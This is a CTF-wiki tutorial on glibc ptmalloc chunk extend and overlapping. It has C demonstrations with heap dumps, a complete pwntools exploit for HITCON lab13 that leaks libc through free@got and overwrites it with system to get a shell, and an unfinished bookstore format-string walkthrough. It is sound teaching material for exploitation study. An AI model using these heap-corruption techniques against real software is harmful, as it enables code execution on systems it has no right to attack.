# Chunk Extend and Overlapping

## Introduction
Chunk extend is a common exploitation technique for heap vulnerabilities. Through extending, one can achieve the effect of chunk overlapping. This exploitation method requires the following timing and conditions:

* A heap-based vulnerability exists in the program
* The vulnerability can control data in the chunk header

## Principle
The reason chunk extend works is due to the various macros ptmalloc uses when operating on heap chunks.

In ptmalloc, the operation to get the chunk size is as follows
```
/* Get size, ignoring use bits */
#define chunksize(p) (chunksize_nomask(p) & ~(SIZE_BITS))

/* Like chunksize, but do not mask SIZE_BITS.  */
#define chunksize_nomask(p) ((p)->mchunk_size)
```
One method directly gets the chunk size without ignoring the mask bits, while the other ignores the mask bits.

In ptmalloc, the operation to get the next chunk's address is as follows
```
/* Ptr to next physical malloc_chunk. */
#define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))
```
It uses the current chunk pointer plus the current chunk size.

In ptmalloc, the operation to get the previous chunk's information is as follows
```
/* Size of the chunk below P.  Only valid if prev_inuse (P).  */
#define prev_size(p) ((p)->mchunk_prev_size)

/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */
#define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))
```
It obtains the previous chunk's size through malloc_chunk->prev_size, then subtracts that size from the current chunk's address.

In ptmalloc, the operation to check whether the current chunk is in use is as follows:
```
#define inuse(p)
    ((((mchunkptr)(((char *) (p)) + chunksize(p)))->mchunk_size) & PREV_INUSE)
```
It checks the prev_inuse field of the next chunk, and the next chunk's address is calculated based on the current chunk's size as described above.

For more operations, see the `Heap-Related Data Structures` section.

From the macros above, we can see that ptmalloc uses the data in the chunk header to determine the chunk's usage status and to locate the chunks before and after it. In short, chunk extend works by controlling the size and prev_size fields to perform cross-chunk operations, resulting in overlapping.

Similar to chunk extend, there is also an operation called chunk shrink. Here we only introduce the exploitation of chunk extend.

## Basic Example 1: Extending an In-Use Fastbin
Simply put, the effect of this exploitation is to control the content of the second chunk by modifying the size of the first chunk.
**Note that our examples are all for 64-bit programs. If you want to test on 32-bit, you can change the 8-byte offsets to 4-byte offsets**.
```
int main(void)
{
    void *ptr,*ptr1;
    
    ptr=malloc(0x10);// Allocate the first 0x10 chunk
    malloc(0x10);// Allocate the second 0x10 chunk
    
    *(long long *)((long long)ptr-0x8)=0x41;// Modify the size field of the first chunk
    
    free(ptr);
    ptr1=malloc(0x30);// Achieve extend, now controls the second chunk's content
    return 0;
}
```
After the two malloc statements are executed, the heap memory layout is as follows
```
0x602000:	0x0000000000000000	0x0000000000000021 <=== chunk 1
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000000021 <=== chunk 2
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000020fc1 <=== top chunk
```
Next, we change chunk1's size field to 0x41. The value 0x41 is used because the chunk's size field includes both the user-controlled size and the header size. As shown above, the total size is exactly 0x40. In a real challenge, this step can be achieved through a heap overflow.
```
0x602000:	0x0000000000000000	0x0000000000000041 <=== tampered size
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000000021
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000020fc1 
```
After executing free, we can see that chunk2 and chunk1 are merged into a single 0x40-sized chunk and freed together.
```
Fastbins[idx=0, size=0x10] 0x00
Fastbins[idx=1, size=0x20] 0x00
Fastbins[idx=2, size=0x30]  ←  Chunk(addr=0x602010, size=0x40, flags=PREV_INUSE) 
Fastbins[idx=3, size=0x40] 0x00
Fastbins[idx=4, size=0x50] 0x00
Fastbins[idx=5, size=0x60] 0x00
Fastbins[idx=6, size=0x70] 0x00
```
Then, through malloc(0x30), we obtain the combined chunk1+chunk2 block. At this point, we can directly control the content of chunk2. We also call this state an overlapping chunk.
```
call   0x400450 <malloc@plt>
mov    QWORD PTR [rbp-0x8], rax

rax = 0x602010
```

## Basic Example 2: Extending an In-Use Smallbin
From our earlier deep dive into the heap implementation, we know that chunks in the fastbin range are placed into the fastbin linked list after being freed, while chunks outside this range are placed into the unsorted bin linked list.
In the following example, we use a size of 0x80 for allocation (for comparison, the default maximum usable range for a fastbin chunk is 0x70)
```
int main()
{
    void *ptr,*ptr1;
    
    ptr=malloc(0x80);// Allocate the first 0x80 chunk1
    malloc(0x10); // Allocate the second 0x10 chunk2
    malloc(0x10); // Prevent merging with top chunk
    
    *(int *)((int)ptr-0x8)=0xb1;
    free(ptr);
    ptr1=malloc(0xa0);
}
```
In this example, since the allocated size is not in the fastbin range, if it is adjacent to the top chunk when freed, it will be merged with the top chunk. Therefore, we need to allocate an extra chunk to separate the freed block from the top chunk.
```
0x602000:	0x0000000000000000	0x00000000000000b1 <===chunk1 tampered size field
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000000000
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000000
0x602050:	0x0000000000000000	0x0000000000000000
0x602060:	0x0000000000000000	0x0000000000000000
0x602070:	0x0000000000000000	0x0000000000000000
0x602080:	0x0000000000000000	0x0000000000000000
0x602090:	0x0000000000000000	0x0000000000000021 <=== chunk2
0x6020a0:	0x0000000000000000	0x0000000000000000
0x6020b0:	0x0000000000000000	0x0000000000000021 <=== chunk to prevent merging
0x6020c0:	0x0000000000000000	0x0000000000000000
0x6020d0:	0x0000000000000000	0x0000000000020f31 <=== top chunk
```
After freeing, chunk1 swallows chunk2's content and they are placed into the unsorted bin together
```
0x602000:	0x0000000000000000	0x00000000000000b1 <=== placed into unsorted bin
0x602010:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
0x602020:	0x0000000000000000	0x0000000000000000
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000000
0x602050:	0x0000000000000000	0x0000000000000000
0x602060:	0x0000000000000000	0x0000000000000000
0x602070:	0x0000000000000000	0x0000000000000000
0x602080:	0x0000000000000000	0x0000000000000000
0x602090:	0x0000000000000000	0x0000000000000021
0x6020a0:	0x0000000000000000	0x0000000000000000
0x6020b0:	0x00000000000000b0	0x0000000000000020 <=== note this is marked as free
0x6020c0:	0x0000000000000000	0x0000000000000000
0x6020d0:	0x0000000000000000	0x0000000000020f31 <=== top chunk
```
```
[+] unsorted_bins[0]: fw=0x602000, bk=0x602000
 →   Chunk(addr=0x602010, size=0xb0, flags=PREV_INUSE)
```
When allocation is performed again, it will reclaim the space of both chunk1 and chunk2. At this point, we can control the content of chunk2
```
     0x4005b0 <main+74>        call   0x400450 <malloc@plt>
 →   0x4005b5 <main+79>        mov    QWORD PTR [rbp-0x8], rax
 
     rax : 0x0000000000602010
```

## Basic Example 3: Extending a Freed Smallbin
Example 3 builds upon Example 2. This time we first free chunk1, then modify the size field of chunk1 while it is in the unsorted bin.
```
int main()
{
    void *ptr,*ptr1;
    
    ptr=malloc(0x80);// Allocate the first 0x80 chunk1
    malloc(0x10);// Allocate the second 0x10 chunk2
    
    free(ptr);// Free first, so chunk1 enters the unsorted bin
    
    *(int *)((int)ptr-0x8)=0xb1;
    ptr1=malloc(0xa0);
}
```
The result after the two mallocs is as follows
```
0x602000:	0x0000000000000000	0x0000000000000091 <=== chunk 1
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000000000
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000000
0x602050:	0x0000000000000000	0x0000000000000000
0x602060:	0x0000000000000000	0x0000000000000000
0x602070:	0x0000000000000000	0x0000000000000000
0x602080:	0x0000000000000000	0x0000000000000000
0x602090:	0x0000000000000000	0x0000000000000021 <=== chunk 2
0x6020a0:	0x0000000000000000	0x0000000000000000
0x6020b0:	0x0000000000000000	0x0000000000020f51
```
We first free chunk1 so it enters the unsorted bin
```
     unsorted_bins[0]: fw=0x602000, bk=0x602000
 →   Chunk(addr=0x602010, size=0x90, flags=PREV_INUSE)

0x602000:	0x0000000000000000	0x0000000000000091 <=== entered unsorted bin
0x602010:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
0x602020:	0x0000000000000000	0x0000000000000000
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000000
0x602050:	0x0000000000000000	0x0000000000000000
0x602060:	0x0000000000000000	0x0000000000000000
0x602070:	0x0000000000000000	0x0000000000000000
0x602080:	0x0000000000000000	0x0000000000000000
0x602090:	0x0000000000000090	0x0000000000000020 <=== chunk 2
0x6020a0:	0x0000000000000000	0x0000000000000000
0x6020b0:	0x0000000000000000	0x0000000000020f51 <=== top chunk
```
Then we tamper with chunk1's size field
```
0x602000:	0x0000000000000000	0x00000000000000b1 <=== size field tampered
0x602010:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
0x602020:	0x0000000000000000	0x0000000000000000
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000000
0x602050:	0x0000000000000000	0x0000000000000000
0x602060:	0x0000000000000000	0x0000000000000000
0x602070:	0x0000000000000000	0x0000000000000000
0x602080:	0x0000000000000000	0x0000000000000000
0x602090:	0x0000000000000090	0x0000000000000020
0x6020a0:	0x0000000000000000	0x0000000000000000
0x6020b0:	0x0000000000000000	0x0000000000020f51
```
At this point, performing a malloc allocation will return the combined chunk1+chunk2 block, thereby controlling the content of chunk2.

## What Can Chunk Extend/Shrink Do  

Generally speaking, this technique cannot directly control the program's execution flow, but it can control the content within a chunk. If the chunk contains string pointers, function pointers, etc., these pointers can be used for information leakage and controlling the execution flow.

Furthermore, extend can be used to achieve chunk overlapping, and through overlapping, we can control a chunk's fd/bk pointers, enabling exploits such as fastbin attack.

## Basic Example 4: Backward Overlapping Through Extend
Here we demonstrate backward overlapping through extend. This is the most common scenario in CTF challenges, and overlapping can be used to achieve other exploits.
```
int main()
{
    void *ptr,*ptr1;
    
    ptr=malloc(0x10);// Allocate the 1st 0x80 chunk1
    malloc(0x10); // Allocate the 2nd 0x10 chunk2
    malloc(0x10); // Allocate the 3rd 0x10 chunk3
    malloc(0x10); // Allocate the 4th 0x10 chunk4    
    *(int *)((int)ptr-0x8)=0x61;
    free(ptr);
    ptr1=malloc(0x50);
}
```
After malloc(0x50) reclaims the extended region, the 0x10 fastbin chunks within it can still be allocated and freed normally. At this point, overlapping has been achieved, and operations on the overlapping area can be used to perform a fastbin attack.

## Basic Example 5: Forward Overlapping Through Extend
Here we demonstrate merging preceding chunks by modifying the prev_inuse and prev_size fields
```
int main(void)
{
	void *ptr1,*ptr2,*ptr3,*ptr4;
	ptr1=malloc(128);//smallbin1
	ptr2=malloc(0x10);//fastbin1
	ptr3=malloc(0x10);//fastbin2
	ptr4=malloc(128);//smallbin2
	malloc(0x10);// Prevent merging with top chunk
	free(ptr1);
	*(int *)((long long)ptr4-0x8)=0x90;// Modify the prev_inuse field
	*(int *)((long long)ptr4-0x10)=0xd0;// Modify the prev_size field
	free(ptr4);// Unlink performs forward extend
	malloc(0x150);// Placeholder chunk
	
}
```
Forward extend leverages the unlink mechanism of smallbins. By modifying the prev_size field, it is possible to merge across multiple chunks to achieve overlapping.

## HITCON Training lab13
[Challenge link](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/chunk-extend-shrink/hitcontraning_lab13)

### Basic Information

```shell
➜  hitcontraning_lab13 git:(master) file heapcreator
heapcreator: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=5e69111eca74cba2fb372dfcd3a59f93ca58f858, not stripped
➜  hitcontraning_lab13 git:(master) checksec heapcreator
[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/chunk_extend_shrink/hitcontraning_lab13/heapcreator'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

The program is a 64-bit dynamically linked binary with Canary and NX protections enabled.

### Basic Functionality

The program is essentially a custom heap allocator. Each heap entry has two members: size and content pointer. The main functions are as follows

1. Create heap: Allocates memory space according to the user-input length, and uses read to read the specified length of content. The length is not validated here — when the length is negative, an arbitrary-length heap overflow vulnerability occurs. Of course, the prerequisite is that malloc can succeed. Additionally, a NULL terminator is not set after reading.
2. Edit heap: Reads content of the specified length based on the given index and the previously stored heap size. However, the read length here is 1 byte more than the original size, so an **off-by-one vulnerability exists**.
3. Show heap: Outputs the size and content of the heap at the specified index.
4. Delete heap: Deletes the specified heap and sets the corresponding pointer to NULL.

### Exploitation

The basic exploitation approach is as follows

1. Use the off-by-one vulnerability to overwrite the size field of the next chunk, thereby constructing a fake chunk size.
2. Allocate a chunk with the fake size, resulting in chunk overlap, which allows modification of critical pointers.

For more details, refer directly to the script.

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

r = process('./heapcreator')
heap = ELF('./heapcreator')
libc = ELF('./libc.so.6')


def create(size, content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)


def edit(idx, content):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(content)


def show(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))


def delete(idx):
    r.recvuntil(":")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))


free_got = 0x602018
create(0x18, "dada")  # 0
create(0x10, "ddaa")  # 1
# overwrite heap 1's struct's size to 0x41
edit(0, "/bin/sh\x00" + "a" * 0x10 + "\x41")
# trigger heap 1's struct to fastbin 0x40
# heap 1's content to fastbin 0x20
delete(1)
# new heap 1's struct will point to old heap 1's content, size 0x20
# new heap 1's content will point to old heap 1's struct, size 0x30
# that is to say we can overwrite new heap 1's struct
# here we overwrite its heap content pointer to free@got
create(0x30, p64(0) * 4 + p64(0x30) + p64(heap.got['free']))  #1
# leak freeaddr
show(1)
r.recvuntil("Content : ")
data = r.recvuntil("Done !")

free_addr = u64(data.split("\n")[0].ljust(8, "\x00"))
libc_base = free_addr - libc.symbols['free']
log.success('libc base addr: ' + hex(libc_base))
system_addr = libc_base + libc.symbols['system']
#gdb.attach(r)
# overwrite free@got with system addr
edit(1, p64(system_addr))
# trigger system("/bin/sh")
delete(0)
r.interactive()
```

## 2015 hacklu bookstore
[Challenge link](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/chunk-extend-shrink/2015_hacklu_bookstore)

### Basic Information

```shell
➜  2015_hacklu_bookstore git:(master) file books    
books: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3a15f5a8e83e55c535d220473fa76c314d26b124, stripped
➜  2015_hacklu_bookstore git:(master) checksec books    
[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/chunk_extend_shrink/2015_hacklu_bookstore/books'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

As we can see, the program is a dynamically linked 64-bit binary with Canary and NX protections enabled.

### Basic Functionality

The program's main functionality is ordering books. The details are as follows

- A maximum of two books can be ordered.
- Books are selected by number, and a name can be added for each book. However, the name input has an arbitrary-length heap overflow vulnerability.
- Orders can be deleted by number, but it simply frees the memory without setting the pointer to NULL, resulting in a use-after-free vulnerability.
- Submit order, which concatenates the names of both books together. Due to the heap overflow issue mentioned above, this also introduces a heap overflow vulnerability.
- Additionally, there is a **format string vulnerability** just before the program exits.

Although the program has very powerful vulnerability primitives, all malloc sizes are completely fixed, so we can only work with the chunks allocated by the program.

### Exploitation Approach

The main vulnerabilities in the program are the heap overflow and the format string vulnerability. However, to exploit the format string vulnerability, we need to overflow the corresponding dest array. The specific approach is as follows

1. Use heap overflow to perform chunk extend, so that during submit, `malloc(0x140uLL)` returns exactly the position of the second order. Before submitting, set up the heap memory layout so that after string concatenation, it precisely overwrites dest with the desired format string.
2. By constructing dest as a specific format string: on one hand, leak the address of __libc_start_main_ret, **and on the other hand, control the program to return to execution**. At this point, we can determine the libc base address, system address, etc. Note that once submit is executed, the program will exit directly, so a good approach is to modify a variable in fini_array to **return to our desired location** after the program finishes execution. Here we use a trick: each time the program reads a selection, it reads 128 bytes onto the stack. When the program finally outputs dest, the previously read selection data is still on the stack. So if we pre-place some control flow pointers on the stack, we can control the program's execution flow.
3. Exploit the format string vulnerability again to overwrite free@got with the system address, achieving arbitrary command execution.

Here, the offsets for each parameter are

- Fini_array0 : 5+8=13
- __libc_start_main_ret : 5+0x1a=31.

```
00:0000│ rsp  0x7ffe6a7f3ec8 —▸ 0x400c93 ◂— mov    eax, 0
01:0008│      0x7ffe6a7f3ed0 ◂— 0x100000000
02:0010│      0x7ffe6a7f3ed8 —▸ 0x9f20a0 ◂— 0x3a3120726564724f ('Order 1:')
03:0018│      0x7ffe6a7f3ee0 —▸ 0x400d38 ◂— pop    rcx
04:0020│      0x7ffe6a7f3ee8 —▸ 0x9f2010 ◂— 0x6666666666667325 ('%sffffff')
05:0028│      0x7ffe6a7f3ef0 —▸ 0x9f20a0 ◂— 0x3a3120726564724f ('Order 1:')
06:0030│      0x7ffe6a7f3ef8 —▸ 0x9f2130 ◂— 0x6564724f203a3220 (' 2: Orde')
07:0038│      0x7ffe6a7f3f00 ◂— 0xa35 /* '5\n' */
08:0040│      0x7ffe6a7f3f08 ◂— 0x0
... ↓
0b:0058│      0x7ffe6a7f3f20 ◂— 0xff00000000000000
0c:0060│      0x7ffe6a7f3f28 ◂— 0x0
... ↓
0f:0078│      0x7ffe6a7f3f40 ◂— 0x5f5f00656d697474 /* 'ttime' */
10:0080│      0x7ffe6a7f3f48 ◂— 0x7465675f6f736476 ('vdso_get')
11:0088│      0x7ffe6a7f3f50 ◂— 0x1
12:0090│      0x7ffe6a7f3f58 —▸ 0x400cfd ◂— add    rbx, 1
13:0098│      0x7ffe6a7f3f60 ◂— 0x0
... ↓
15:00a8│      0x7ffe6a7f3f70 —▸ 0x400cb0 ◂— push   r15
16:00b0│      0x7ffe6a7f3f78 —▸ 0x400780 ◂— xor    ebp, ebp
17:00b8│      0x7ffe6a7f3f80 —▸ 0x7ffe6a7f4070 ◂— 0x1
18:00c0│      0x7ffe6a7f3f88 ◂— 0xd8d379f22453ff00
19:00c8│ rbp  0x7ffe6a7f3f90 —▸ 0x400cb0 ◂— push   r15
1a:00d0│      0x7ffe6a7f3f98 —▸ 0x7f9db2113830 (__libc_start_main+240) ◂— mov    edi, eax
```

**!!! To be continued !!!**

## Challenges

- [2016 Nuit du Hack CTF Quals : night deamonic heap](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/chunk-extend-shrink/2016_NuitduHack_nightdeamonicheap)
